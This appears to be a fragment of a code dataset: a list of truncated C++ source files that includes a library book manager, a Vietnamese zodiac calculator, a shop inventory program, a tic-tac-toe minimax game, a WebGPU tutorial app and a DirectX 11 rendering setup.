if(choice==\"2\"){\t\r\n\tdeleteBook(counter); \r\n}\r\nelse if(choice==\"3\"){\r\n\teditBook(counter); \t\r\n}\r\nelse if(choice==\"4\"){\r\n\tsearchBook(counter); \t\r\n}\r\nelse if(choice==\"5\"){\r\n\tviewAllBooks(counter); \t\r\n}\r\nelse if(choice==\"6\"){\r\n\tquit();\t //function call\r\n}\r\nelse{\r\n\tmain();  \r\n}\r\n\t\r\n_getch();\r\nreturn 0;\r\n}\r\n\r\n\r\n\r\nvoid addBook(int counter){\r\n\tstring isbn,title,author,edition,publication;\r\n\tcout<<\"ADD BOOK\\n\\n\";\r\n\tif(counter<10){\r\n\t\tcout<<\"Enter ISBN: \";\r\n\t\tgetline(cin,isbn); //getline - just like cin but includes white spaces\r\n\t\tcout<<\"Enter Title: \";\r\n\t\tgetline(cin,title);\r\n\t\tcout<<\"Enter Author: \";\r\n\t\tgetline(cin,author);\r\n\t\tcout<<\"Enter Edition: \";\r\n\t\tgetline(cin,edition);\r\n\t\tcout<<\"Enter Publication: \";\r\n\t\tgetline(cin,publication);\r\n\t\tbooks[counter].setIsbn(isbn); //assigning \r\n\t\tbooks[counter].setTitle(title);\r\n\t\tbooks[counter].setAuthor(author);\r\n\t\tbooks[counter].setEdition(edition);\r\n\t\tbooks[counter].setPublication(publication);\t\r\n\t\tincrement(counter);\t// increment counter\r\n\t\tcout<<\"\\nBOOK ADDED SUCCESSFULLY!\\n\\nPress any key to continue . . .\";\r\n\t\t_getch();\r\n\t\tmain();\r\n\t}\r\n\telse{\r\n\t\tcout<<\"YOU HAVE REACHED THE MAXIMUM NUMBER OF BOOKS TOBE ADDED!\\n\\nPress any key to continue . . .\";\r\n\t\t_getch();\r\n\t\tmain();\r\n\t}\r\n}\r\n\r\n\r\nvoid deleteBook(int counter){\r\n\tstring isbn;\r\n\tint choice;\r\n\tcout<<\"DELETE BOOK\\n\\n\";\r\n\tif(counter==0){\r\n\t\tcout<<\"THERE IS NO BOOK TO DELETE!\\n\\nPress any key to continue . . .\";\r\n\t\t_getch();\r\n\t\tmain();\r\n\t}\r\n\tcout<<\"Enter ISBN: \";\r\n\tgetline(cin,isbn);\r\n\r\n\tfor(int i=0;i<counter;i++){\r\n\t\t//finding a match \r\n\t\tif(books[i].getIsbn()==isbn){\r\n\t\t\tcout<<\"\\nBOOK FOUND\\n\\n\";\r\n\t\t\tcout<<\"Do you want to delete?\\n[1]Yes\\n[2]No\\n\\nEnter Choice: \";\r\n\t\t\tcin>>choice;\r\n\t\t\tif(choice==1){\r\n\t\t\t\tbooks[i].setIsbn(\"\"); \r\n\t\t\t\tbooks[i].setTitle(\"\");\r\n\t\t\t\tbooks[i].setAuthor(\"\");\r\n\t\t\t\tbooks[i].setEdition(\"\");\r\n\t\t\t\tbooks[i].setPublication(\"\");\r\n\t\t\t\tfor(int a=i;a<counter;a++){\r\n\t\t\t\t\t//adjusting the values after deletion \r\n\t\t\t\t\tbooks[a] = books[a+1];\r\n\t\t\t\t}\r\n\t\t\t\tbooks[9].setIsbn(\"\"); //adjustment if the library is full(10 books)\r\n\t\t\t\tbooks[9].setTitle(\"\");\r\n\t\t\t\tbooks[9].setAuthor(\"\");\r\n\t\t\t\tbooks[9].setEdition(\"\");\r\n\t\t\t\tbooks[9].setPublication(\"\");\r\n\t\t\t\tdecrement(counter); //calling function to decrement counter\r\n\t\t\t\tcout<<\"\\nBOOK SUCCESSFULLY DELETED!\\n\\nPress any key to continue . . .\";\r\n\t\t\t\t_getch();\r\n\t\t\t\tmain();\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tmain();\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tcout<<\"\\nBOOK NOT FOUND!\\n\\nPress any key to continue . . .\";\r\n\t_getch();\r\n\tmain();\r\n\t\r\n}\r\nvoid editBook(int counter){\r\n\tsystem(\"CLS\");\r\n\tstring editIsbn,choice;\r\n\tstring isbn,title,author,edition,publication;\r\n\tcout<<\"\\nEDIT BOOK\\n\\n\";\r\n\tif(counter==0){\r\n\t\tcout<<\"THERE IS NO BOOK TO EDIT!\\n\\nPress any key to continue . . .\";\r\n\t\t_getch();\r\n\t\tmain();\r\n\t}\r\n\tcout<<\"Enter ISBN: \";\r\n\tgetline(cin,editIsbn);\r\n\tfor(int i=0;i<counter;i++){\r\n\t\t//finding a match using for loop\r\n\t\tif(books[i].getIsbn()==editIsbn){\r\n\t\t\tcout<<\"\\nBOOK FOUND!\\n\\n\";\r\n\t\t\tcout<<\"ISBN: \"<<books[i].getIsbn()<<endl;\r\n\t\t\tcout<<\"TITLE: \"<<books[i].getTitle()<<endl;\r\n\t\t\tcout<<\"AUTHOR: \"<<books[i].getAuthor()<<endl;\r\n\t\t\tcout<<\"EDITION: \"<<books[i].getEdition()<<endl;\r\n\t\t\tcout<<\"PUBLICATION: \"<<books[i].getPublication()<<endl;\r\n\t\t\tcout<<\"\\nDo you want to edit?\\n[1]Yes\\n[2]No\\n\\nEnter choice: \";\r\n\t\t\tgetline(cin,choice);\r\n\t\t\tif(choice==\"1\"){\r\n\t\t\t\t//re-ente",
    "\ufeff// CPP_TINHTUOI.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\n\nint main() {\n    int namsinh;\n    string can, chi;\n    cin >> namsinh;\n    cout << \"NAM SINH: \" << namsinh << endl;\n    switch (namsinh % 10) {\n    case 0:\n        can = \"CANH\";\n        break;\n    case 1:\n        can = \"TAN\";\n        break;\n    case 2:\n        can = \"NHAM\";\n        break;\n    case 3:\n        can = \"QUY\";\n        break;\n    case 4:\n        can = \"GIAP\";\n        break;\n    case 5:\n        can = \"AT\";\n        break;\n    case 6:\n        can = \"BINH\";\n        break;\n    case 7:\n        can = \"\u0110INH\";\n        break;\n    case 8:\n        can = \"MAU\";\n        break;\n    case 9:\n        can = \"KY\";\n        break;\n    }\n    switch (namsinh % 12) {\n    case 0:\n        chi = \"THAN\";\n        break;\n    case 1:\n        chi = \"DAU\";\n        break;\n    case 2:\n        chi = \"TUAT\";\n        break;\n    case 3:\n        chi = \"HOI\";\n        break;\n    case 4:\n        chi = \"TY\";\n        break;\n    case 5:\n        chi = \"SUU\";\n        break;\n    case 6:\n        chi = \"DAN\";\n        break;\n    case 7:\n        chi = \"MEO\";\n        break;\n    case 8:\n        chi = \"THIN\";\n        break;\n    case 9:\n        chi = \"TY\";\n        break;\n    case 10:\n        chi = \"NGO\";\n        break;\n    case 11:\n        chi = \"MUI\";\n        break;\n    }\n    cout << \"Tu\u1ed5i: \" << can << \" \" << chi << endl;\n    return 0;\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "//***************************************************************\r\n//                   HEADER FILE USED IN PROJECT\r\n//***************************************************************\r\n#include<windows.h>\r\n#include<mmsystem.h>\r\n#include<iomanip>\r\n#include<stdio.h>\r\n#include<cstring>\r\n#include<stdlib.h>\r\n#include\"jlogin.h\"\r\n#include<conio.h>\r\n#include<process.h>\r\n#include<fstream>\r\n#include<iostream>\r\nusing namespace std;\r\nvoid admin_menu();\r\nvoid r_admin_menu();\r\nvoid main_menu();\r\nvoid gotoxy(int ,int);\r\nint mini_main();\r\n//***************************************************************\r\n//                   CLASS USED IN PROJECT\r\n//***************************************************************\r\n\r\nclass item\r\n{\r\n int ino;\r\n char name[100];\r\n float price,qty,tax,dis;\r\n public:\r\n\tvoid create_item()\r\n\t{\r\n\t cout<<\"\\n\\nPlease Enter The No. of The Item : \";\r\n\t cin>>ino;\r\n\t cout<<\"\\nPlease Enter The Name of The Item : \";\r\n\tfflush(stdin);\r\n\tcin.getline(name,100);\r\n\t cout<<\"\\nPlease Enter The price of The Item : \";\r\n\t cin>>price;\r\n\t cout<<\"\\nPlease Enter The Discount (%) : \";\r\n\t cin>>dis;\r\n\t }\r\n\r\n\tvoid show_item()\r\n\t{\r\n\t cout<<\"\\nThe Item No. of The Item : \"<<ino;\r\n\t cout<<\"\\nThe Name of The Item : \";\r\n\t puts(name);\r\n\t cout<<\"\\nThe price of The Item : \"<<price;\r\n\t cout<<\"\\nDiscount : \"<<dis;\r\n\t }\r\n\r\n  int  retino()\r\n  {return ino;}\r\n\r\n  float retprice()\r\n  {return price;}\r\n\r\n  char* retname()\r\n  {return name;}\r\n\r\n  int retdis()\r\n  {return dis;}\r\n\r\n};         //class ends here\r\n\r\n\r\n\r\n//***************************************************************\r\n//    \tglobal declaration for stream object\r\n//****************************************************************\r\n\r\n fstream fp;\r\n item itm;\r\n// COORD coord={0,0};\r\n\r\n//***************************************************************\r\n//    \tfunction to write in file\r\n//****************************************************************\r\n\r\nvoid write_item()\r\n{\r\n\r\n fp.open(\"Shop.dat\",ios::out|ios::app);\r\n    char a;\r\n    gotoxy(5,0);\r\n    cout<<\"CREATE ITEM\";\r\n    do{\r\n        itm.create_item();\r\n        fp.write((char*)&itm,sizeof(item));\r\n        cout<<\"\\nDo you want to add another item please confirm ? (y/n) : \";\r\n        \t PlaySound(\"confirm.wav\", NULL, SND_ASYNC);\r\n        cin>>a;\r\n    }while(a=='y' || a=='Y');\r\n\r\n    fp.close();\r\n    cout<<\"\\n\\nThe item Has Been Created : \";\r\n    gotoxy(175,49);\r\n    //system(\"pause\");\r\n    r_admin_menu();\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n//***************************************************************\r\n//    \tfunction to read all records from file\r\n//****************************************************************\r\n\r\n\r\nvoid display_all()\r\n{\r\n    system(\"cls\");\r\n\r\n    cout<<\"\\n\\n\\n\\t\\tDISPLAY ALL RECORD !!!\\n\\n\";\r\n    fp.open(\"Shop.dat\",ios::in);\r\n    while(fp.read((char*)&itm,sizeof(item)))\r\n\t{\r\n\t itm.show_item();\r\n\t cout<<\"\\n\"<<endl;\r\n\t for(int i=0;i<30;i++)\r\n        cout<<\"=\";\r\n\t }\r\n    fp.close();\r\n   //gotoxy(175,49);\r\n  cout<<\"\\n\\n\";\r\n   system(\"pause\");\r\n}\r\n\r\n\r\n//***************************************************************\r\n//    \tfunction to read specific record from file\r\n//****************************************************************\r\n\r\n\r\nvoid display_sp(int n)\r\n{\r\n    int flag=0;\r\n    fp.open(\"Shop.dat\",ios::in);\r\n    while(fp.read((char*)&itm,sizeof(item)))\r\n\t{\r\n\t if(itm.retino()==n)\r\n\t\t{\r\n\t\t //system(\"cls\");\r\n\t\t itm.show_item();\r\n\t\t flag=1;\r\n\t\t}\r\n\t}\r\n    fp.close();\r\nif(flag==0)\r\n cout<<\"\\n\\nRecord not Exist\";\r\n    gotoxy(175,49);system(\"pause\");\r\n    r_admin_menu();\r\n}\r\n\r\n\r\n//***************************************************************\r\n//    \tfunction to modify record of file\r\n//****************************************************************\r\n\r\n\r\nvoid modify_item()\r\n{\r\n    int no,found=0;\r\n    system(\"cls\");\r\n    cout<<\"\\n\\n\\tTo Modify \";\r\n    cout<<\"\\n\\n\\tPlease Enter The Item No. of The Item\";\r\n    cin>>no;\r\n    fp.open(\"Shop.dat\",ios::in|ios::out);\r\n    while(fp.read((char*)&itm,sizeof(item)) && found==0)\r\n\t   {\r\n\t    if(itm.retino()==no)\r\n\t\t   {\r\n\t\t    itm.show_item();\r\n\t\t    cout<<\"\\n\\nPlease Enter The New Details of Item\"<<endl;\r\n\t\t    itm.create_item();\r\n\t\t    int pos=-1*sizeof(itm);\r\n\t\t    fp.seekp(pos,ios::cur);\r\n\t\t    fp.write((char*)&itm,sizeof(item));\r\n\t\t    cout<<\"\\n\\n\\t Record Updated\\n\";\r\n\t\t    found=1;\r\n\t\t   }\r\n\t     }\r\n    fp.close();\r\n    if(found==0)\r\n    cout<<\"\\n\\n Record Not Found \\n\\n\";\r\n    gotoxy(175,49);\r\n    system(\"pause\");\r\n    r_admin_menu();\r\n}\r\n\r\n\r\n//***************************************************************\r\n//    \tfunction to delete record of file\r\n//****************************************************************\r\n\r\n\r\nvoid delete_item()\r\n   {\r\n\r\n    int no;\r\n    system(\"cls\");\r\n    display_all();\r\n    cout<<\"\\n\\n\\n\\t\\t**********    Delete Record    **********\";\r\n    cout<<\"\\n\\nPlease Enter The Item no. of The Item You Want To Delete : \";\r\n    cin>>no;\r\n\r\n    cout<<\"\\nAre you sure ? (y/n) : \";\r\n    char a;\r\n PlaySound(\"confirm.wav\", NULL, SND_ASYNC);\r\n    cin>>a;\r\n    if(a=='y' || a=='Y')",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n#define COMPUTER 1\n#define HUMAN 2\n#define SIDE 3\n#define COMPUTERMOVE 'O'\n#define HUMANMOVE 'X'\n  void\nshowBoard (char board[][SIDE]) \n{\n  \nprintf (\"\\t\\t\\t %c | %c | %c \\n\", board[0][0], board[0][1], board[0][2]);\n  \nprintf (\"\\t\\t\\t-----------\\n\");\n  \nprintf (\"\\t\\t\\t %c | %c | %c \\n\", board[1][0], board[1][1], board[1][2]);\n  \nprintf (\"\\t\\t\\t-----------\\n\");\n  \nprintf (\"\\t\\t\\t %c | %c | %c \\n\\n\", board[2][0], board[2][1], board[2][2]);\n\n} \nvoid\n\nshowInstructions () \n{\n  \nprintf (\"\\nChoose a cell numbered from 1 to 9 as below and play\\n\\n\");\n  \nprintf (\"\\t\\t\\t 1 | 2 | 3 \\n\");\n  \nprintf (\"\\t\\t\\t-----------\\n\");\n  \nprintf (\"\\t\\t\\t 4 | 5 | 6 \\n\");\n  \nprintf (\"\\t\\t\\t-----------\\n\");\n  \nprintf (\"\\t\\t\\t 7 | 8 | 9 \\n\\n\");\n\n} \nvoid\n\ninitialise (char board[][SIDE]) \n{\n  \n// Initially the board to '*' as said\n    for (int i = 0; i < SIDE; i++)\n    \n    {\n      \nfor (int j = 0; j < SIDE; j++)\n\t\nboard[i][j] = '*';\n\n} \n} \nvoid\n\ndeclareWinner (int whoseTurn) \n{\n  \nif (whoseTurn == COMPUTER)\n    \nprintf (\"COMPUTER has won\\n\");\n  \n  else\n    \nprintf (\"HUMAN has won\\n\");\n\n}\n\n\nbool rowCrossed (char board[][SIDE]) \n{\n  \nfor (int i = 0; i < SIDE; i++)\n    \n    {\n      \nif (board[i][0] == board[i][1] && \nboard[i][1] == board[i][2]\n\t   && \nboard[i][0] != '*')\n\t\nreturn (true);\n    \n}\n  \nreturn (false);\n\n}\n\n\nbool columnCrossed (char board[][SIDE]) \n{\n  \nfor (int i = 0; i < SIDE; i++)\n    \n    {\n      \nif (board[0][i] == board[1][i] && \nboard[1][i] == board[2][i]\n\t   && \nboard[0][i] != '*')\n\t\nreturn (true);\n    \n}\n  \nreturn (false);\n\n}\n\n\nbool diagonalCrossed (char board[][SIDE]) \n{\n  \nif (board[0][0] == board[1][1] && \nboard[1][1] == board[2][2]\n       && \nboard[0][0] != '*')\n    \nreturn (true);\n  \nif (board[0][2] == board[1][1] && \nboard[1][1] == board[2][0]\n       && \nboard[0][2] != '*')\n    \nreturn (true);\n  \nreturn (false);\n\n}\n\n\nbool gameOver (char board[][SIDE]) \n{\n  \nreturn (rowCrossed (board) || columnCrossed (board)\n\t   || diagonalCrossed (board));\n\n}\n\n\nint\nminimax (char board[][SIDE], int depth, bool isAI) \n{\n  \nint score = 0;\n  \nint bestScore = 0;\n  \nif (gameOver (board) == true)\n    \n    {\n      \nif (isAI == true)\n\t\nreturn -10;\n      \nif (isAI == false)\n\t\nreturn +10;\n    \n}\n  \n  else\n    \n    {\n      \nif (depth < 9)\n\t\n\t{\n\t  \nif (isAI == true)\n\t    \n\t    {\n\t      \nbestScore = -999;\n\t      \nfor (int i = 0; i < SIDE; i++)\n\t\t\n\t\t{\n\t\t  \nfor (int j = 0; j < SIDE; j++)\n\t\t    \n\t\t    {\n\t\t      \nif (board[i][j] == '*')\n\t\t\t\n\t\t\t{\n\t\t\t  \nboard[i][j] = COMPUTERMOVE;\n\t\t\t  \nscore = minimax (board, depth + 1, false);\n\t\t\t  \nboard[i][j] = '*';\n\t\t\t  \nif (score > bestScore)\n\t\t\t    \n\t\t\t    {\n\t\t\t      \nbestScore = score;\n\t\t\t    \n}\n\t\t\t\n}\n\t\t    \n}\n\t\t\n}\n\t      \nreturn bestScore;\n\t    \n}\n\t  \n\t  else\n\t    \n\t    {\n\t      \nbestScore = 999;\n\t      \nfor (int i = 0; i < SIDE; i++)\n\t\t\n\t\t{\n\t\t  \nfor (int j = 0; j < SIDE; j++)\n\t\t    \n\t\t    {\n\t\t      \nif (board[i][j] == '*')\n\t\t\t\n\t\t\t{\n\t\t\t  \nboard[i][j] = HUMANMOVE;\n\t\t\t  \nscore = minimax (board, depth + 1, true);\n\t\t\t  \nboard[i][j] = '*';\n\t\t\t  \nif (score < bestScore)\n\t\t\t    \n\t\t\t    {\n\t\t\t      \nbestScore = score;\n\t\t\t    \n}\n\t\t\t\n}\n\t\t    \n}\n\t\t\n}\n\t      \nreturn bestScore;\n\t    \n}\n\t\n}\n      \n      else\n\t\n\t{\n\t  \nreturn 0;\n\t\n}\n    \n}\n\n}\n\n\nint\nbestMove (char board[][SIDE], int moveIndex) \n{\n  \nint x = -1, y = -1;\n  \nint score = 0, bestScore = -999;\n  \nfor (int i = 0; i < SIDE; i++)\n    \n    {\n      \nfor (int j = 0; j < SIDE; j++)\n\t\n\t{\n\t  \nif (board[i][j] == '*')\n\t    \n\t    {\n\t      \nboard[i][j] = COMPUTERMOVE;\n\t      \nscore = minimax (board, moveIndex + 1, false);\n\t      \nboard[i][j] = '*';\n\t      \nif (score > bestScore)\n\t\t\n\t\t{\n\t\t  \nbestScore = score;\n\t\t  \nx = i;\n\t\t  \ny = j;\n\t\t\n}\n\t    \n}\n\t\n}\n    \n}\n  \nreturn x * 3 + y;\n\n}\n\n\n// A function to play Tic-Tac-Toe\n  void\nplayTicTacToe (int whoseTurn) \n{\n  \nchar board[SIDE][SIDE];\n  \nint moveIndex = 0, x = 0, y = 0;\n  \ninitialise (board);\n  \nshowInstructions ();\n  \nwhile (gameOver (board) == false && moveIndex != SIDE * SIDE)\n    \n    {\n      \nint n;\n      \nif (whoseTurn == COMPUTER)\n\t\n\t{\n\t  \nn = bestMove (board, moveIndex);\n\t  \nx = n / SIDE;\n\t  \ny = n % SIDE;\n\t  \nboard[x][y] = COMPUTERMOVE;\n\t  \nprintf (\"COMPUTER has put a %c in cell %d\\n\\n\", COMPUTERMOVE,\n\t\t   \nn + 1);\n\t  \nshowBoard (board);\n\t  \nmoveIndex++;\n\t  \nwhoseTurn = HUMAN;\n\t\n}\n      \n      else if (whoseTurn == HUMAN)\n\t\n\t{\n\t  \nprintf (\"You can insert in the following positions : \");\n\t  \nfor (int i = 0; i < SIDE; i++)\n\t    \nfor (int j = 0; j < SIDE; j++)\n\t      \nif (board[i][j] == '*')\n\t\t\nprintf (\"%d \", (i * 3 + j) + 1);\n\t  \nprintf (\"\\n\\nEnter the position = \");\n\t  \nscanf (\"%d\", &n);\n\t  \nn--;\n\t  \nx = n / SIDE;\n\t  \ny = n % SIDE;\n\t  \nif (board[x][y] == '*' && n < 9 && n >= 0)\n\t    \n\t    {\n\t      \nboard[x][y] = HUMANMOVE;\n\t      \nprintf (\"\\nHUMAN has put a %c in cell %d\\n\\n\", HUMANMOVE,\n\t\t       \nn + 1);\n\t      \nshowBoard (board);\n\t      \nmoveIndex++;\n\t      \nwhoseTurn = COMPUTER;\n\t    \n}\n\t  \n\t  else if (board[x][y] != '*' && n < 9 && n >= 0)\n\t    \n\t    {\n\t      \nprintf\n\t\t(\"\\nPos",
    "#include \"webgpu-utils.h\"\n\n#include <webgpu/webgpu.h>\n#ifdef WEBGPU_BACKEND_WGPU\n#  include <webgpu/wgpu.h>\n#endif // WEBGPU_BACKEND_WGPU\n\n#include <GLFW/glfw3.h>\n#include \"glfw3webgpu.h\"\n\n#include <emscripten.h>\n\n#include <iostream>\n#include <cassert>\n#include <vector>\n\nclass Application {\npublic:\n    // Initialize everything and return true if it went all right\n    bool Initialize();\n\n    // Uninitialize everything that was initialized\n    void Terminate();\n\n    // Draw a frame and handle events\n    void MainLoop();\n\n    // Return true as long as the main loop should keep on running\n    bool IsRunning();\n\nprivate:\n    WGPUTextureView GetNextSurfaceTextureView();\n\nprivate:\n    // We put here all the variables that are shared between init and main loop\n    GLFWwindow *window;\n    WGPUDevice device;\n    WGPUQueue queue;\n    WGPUSurface surface;\n};\n\nint main() {\n    Application app;\n\n    if (!app.Initialize()) {\n        return 1;\n    }\n\n    auto callback = [](void *arg) {\n        Application* pApp = reinterpret_cast<Application*>(arg);\n        pApp->MainLoop(); // 4. We can use the application object\n    };\n    emscripten_set_main_loop_arg(callback, &app, 0, true);\n\n    return 0;\n}\n\nbool Application::Initialize() {\n    // Open window\n    glfwInit();\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n    glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n    window = glfwCreateWindow(640, 480, \"Learn WebGPU\", nullptr, nullptr);\n\n    WGPUInstance instance = wgpuCreateInstance(nullptr);\n\n    std::cout << \"Requesting adapter...\" << std::endl;\n    surface = glfwGetWGPUSurface(instance, window);\n    WGPURequestAdapterOptions adapterOpts = {};\n    adapterOpts.nextInChain = nullptr;\n    adapterOpts.compatibleSurface = surface;\n    WGPUAdapter adapter = requestAdapterSync(instance, &adapterOpts);\n    std::cout << \"Got adapter: \" << adapter << std::endl;\n\n    wgpuInstanceRelease(instance);\n\n    std::cout << \"Requesting device...\" << std::endl;\n    WGPUDeviceDescriptor deviceDesc = {};\n    deviceDesc.nextInChain = nullptr;\n    deviceDesc.label = \"My Device\";\n    deviceDesc.requiredFeatureCount = 0;\n    deviceDesc.requiredLimits = nullptr;\n    deviceDesc.defaultQueue.nextInChain = nullptr;\n    deviceDesc.defaultQueue.label = \"The default queue\";\n    deviceDesc.deviceLostCallback = [](WGPUDeviceLostReason reason, char const* message, void* /* pUserData */) {\n        std::cout << \"Device lost: reason \" << reason;\n        if (message) std::cout << \" (\" << message << \")\";\n        std::cout << std::endl;\n    };\n    device = requestDeviceSync(adapter, &deviceDesc);\n    std::cout << \"Got device: \" << device << std::endl;\n\n    auto onDeviceError = [](WGPUErrorType type, char const* message, void* /* pUserData */) {\n        std::cout << \"Uncaptured device error: type \" << type;\n        if (message) std::cout << \" (\" << message << \")\";\n        std::cout << std::endl;\n    };\n    wgpuDeviceSetUncapturedErrorCallback(device, onDeviceError, nullptr /* pUserData */);\n\n    queue = wgpuDeviceGetQueue(device);\n\n    // Configure the surface\n    WGPUSurfaceConfiguration config = {};\n    config.nextInChain = nullptr;\n\n    // Configuration of the textures created for the underlying swap chain\n    config.width = 640;\n    config.height = 480;\n    config.usage = WGPUTextureUsage_RenderAttachment;\n    WGPUTextureFormat surfaceFormat = wgpuSurfaceGetPreferredFormat(surface, adapter);\n    config.format = surfaceFormat;\n\n    // And we do not need any particular view format:\n    config.viewFormatCount = 0;\n    config.viewFormats = nullptr;\n    config.device = device;\n    config.presentMode = WGPUPresentMode_Fifo;\n    config.alphaMode = WGPUCompositeAlphaMode_Auto;\n\n    wgpuSurfaceConfigure(surface, &config);\n\n    // Release the adapter only after it has been fully utilized\n    wgpuAdapterRelease(adapter);\n\n    return true;\n}\n\nvoid Application::Terminate() {\n    // Unconfigure the surface\n    wgpuSurfaceUnconfigure(surface);\n    wgpuQueueRelease(queue);\n    wgpuSurfaceRelease(surface);\n    wgpuDeviceRelease(device);\n    glfwDestroyWindow(window);\n    glfwTerminate();\n}\n\nvoid Application::MainLoop() {\n    glfwPollEvents();\n\n    // Get the next target texture view\n    WGPUTextureView targetView = GetNextSurfaceTextureView();\n    if (!targetView) return;\n\n    // Create a command encoder for the draw call\n    WGPUCommandEncoderDescriptor encoderDesc = {};\n    encoderDesc.nextInChain = nullptr;\n    encoderDesc.label = \"My command encoder\";\n    WGPUCommandEncoder encoder = wgpuDeviceCreateCommandEncoder(device, &encoderDesc);\n\n    // Create the render pass that clears the screen with our color\n    WGPURenderPassDescriptor renderPassDesc = {};\n    renderPassDesc.nextInChain = nullptr;\n\n    // The attachment part of the render pass descriptor describes the target texture of the pass\n    WGPURenderPassColorAttachment renderPassColorAttachment = {};\n    renderPassColorAttachment.view = targetView;\n    renderPassColorAttachment.resolveTarget = nullptr;\n    renderPassCol",
    "#include <windows.h>\n#include <d3d11.h>\n#include <d3d11_4.h>\n#include <stdexcept>\n\n#pragma comment(lib, \"d3d11.lib\")\n\n#include \"..\\..\\factories\\dx11\\renderer_dx11.hpp\"\n\nusing namespace CheatRenderFramework;\nRendererPtr g_Renderer;\nFontHandle g_FontTahoma;\n\nID3D11Device *g_pd3dDevice = nullptr;\nID3D11DeviceContext *g_pd3dDeviceContext = nullptr;\nIDXGISwapChain *g_pSwapChain = nullptr;\nID3D11RenderTargetView *g_pRenderTargetView = nullptr;\nUINT g_ResizeWidth = 0, g_ResizeHeight = 0;\n\nvoid CleanupDeviceD3D();\nvoid CreateRenderTarget();\nvoid CleanupRenderTarget();\n\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n    case WM_SIZE:\n        if (wParam == SIZE_MINIMIZED)\n            return 0;\n        g_ResizeWidth = (UINT)LOWORD(lParam); // Queue resize\n        g_ResizeHeight = (UINT)HIWORD(lParam);\n        return 0;\n    case WM_DESTROY:\n        PostQuitMessage(0);\n        return 0;\n    default:\n        return DefWindowProc(hWnd, message, wParam, lParam);\n    }\n}\n\nvoid InitD3D(HWND hWnd)\n{\n    RECT rc;\n    GetClientRect(hWnd, &rc);\n    UINT width = rc.right - rc.left;\n    UINT height = rc.bottom - rc.top;\n\n    DXGI_SWAP_CHAIN_DESC sd = {};\n    sd.BufferCount = 1;\n    sd.BufferDesc.Width = width;\n    sd.BufferDesc.Height = height;\n    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\n    sd.BufferDesc.RefreshRate.Numerator = 60;\n    sd.BufferDesc.RefreshRate.Denominator = 1;\n    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\n    sd.OutputWindow = hWnd;\n    sd.SampleDesc.Count = 1;\n    sd.SampleDesc.Quality = 0;\n    sd.Windowed = TRUE;\n\n    D3D_FEATURE_LEVEL featureLevels[] = {D3D_FEATURE_LEVEL_11_1, D3D_FEATURE_LEVEL_11_0};\n\n    HRESULT hr = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, D3D11_CREATE_DEVICE_DEBUG,\n                                               featureLevels, ARRAYSIZE(featureLevels), D3D11_SDK_VERSION, &sd,\n                                               &g_pSwapChain, &g_pd3dDevice, nullptr, &g_pd3dDeviceContext);\n    if (FAILED(hr))\n    {\n        throw std::runtime_error(\"D3D11CreateDeviceAndSwapChain failed\");\n    }\n\n    CreateRenderTarget();\n\n    g_pd3dDeviceContext->OMSetRenderTargets(1, &g_pRenderTargetView, nullptr);\n\n    D3D11_VIEWPORT vp;\n    vp.Width = static_cast<FLOAT>(width);\n    vp.Height = static_cast<FLOAT>(height);\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = 0;\n    vp.TopLeftY = 0;\n    g_pd3dDeviceContext->RSSetViewports(1, &vp);\n}\n\nvoid CleanupDeviceD3D()\n{\n    if (g_pRenderTargetView)\n    {\n        g_pRenderTargetView->Release();\n    }\n\n    if (g_pSwapChain)\n    {\n        g_pSwapChain->Release();\n    }\n\n    if (g_pd3dDeviceContext)\n    {\n        g_pd3dDeviceContext->Release();\n    }\n\n    if (g_pd3dDevice)\n    {\n        g_pd3dDevice->Release();\n    }\n}\n\nvoid CreateRenderTarget()\n{\n    ID3D11Texture2D *pBackBuffer;\n    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));\n\n    HRESULT hr = g_pd3dDevice->CreateRenderTargetView(pBackBuffer, nullptr, &g_pRenderTargetView);\n    if (FAILED(hr))\n    {\n        throw std::runtime_error(\"g_pd3dDevice->CreateRenderTargetView failed\");\n    }\n\n    pBackBuffer->Release();\n}\n\nvoid CleanupRenderTarget()\n{\n    if (g_pRenderTargetView)\n    {\n        g_pRenderTargetView->Release();\n        g_pRenderTargetView = nullptr;\n    }\n}\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hInstance);\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    WNDCLASSEX wc = {sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL,\n                     \"D3D Window\",       NULL};\n    RegisterClassEx(&wc);\n\n    HWND hWnd = CreateWindow(wc.lpszClassName, \"DirectX11 Window\", WS_OVERLAPPEDWINDOW, 100, 100, 800, 600, NULL, NULL,\n                             wc.hInstance, NULL);\n\n    try\n    {\n        InitD3D(hWnd);\n    }\n    catch (const std::runtime_error &e)\n    {\n        MessageBox(NULL, e.what(), \"Error\", MB_OK | MB_ICONERROR);\n        return 0;\n    }\n\n    MSG msg;\n    ZeroMemory(&msg, sizeof(msg));\n    ShowWindow(hWnd, nCmdShow);\n    UpdateWindow(hWnd);\n\n    try\n    {\n        g_Renderer = std::make_shared<Renderer>(g_pd3dDevice, 